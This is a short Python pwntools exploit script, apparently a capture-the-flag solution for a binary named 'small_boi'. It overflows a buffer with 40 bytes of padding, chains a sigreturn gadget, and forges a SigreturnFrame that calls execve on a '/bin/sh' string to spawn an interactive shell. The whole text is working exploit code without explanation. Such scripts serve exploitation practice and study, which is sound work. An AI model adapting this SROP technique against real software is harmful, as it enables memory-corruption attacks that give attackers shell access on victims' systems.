from pwn import *

context.clear(arch ='amd64')
#context.log_level = 'debug'
target = process('./small_boi')
#gdb.attach(target, gdbscript = 'b *(0x4001a4)')
# sys_ret = p64()
syscall = 0x400185
sigret = p64(0x40017d)
frame = SigreturnFrame()
bin_str = 0x4001ca

frame.rax = 0x3b
frame.rdi = bin_str
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall

payload = b'A' * 40
payload += sigret
payload += bytes(frame)
target.sendline(payload)
#gdb.attach(target, 'b *(0x400187)')
target.interactive()
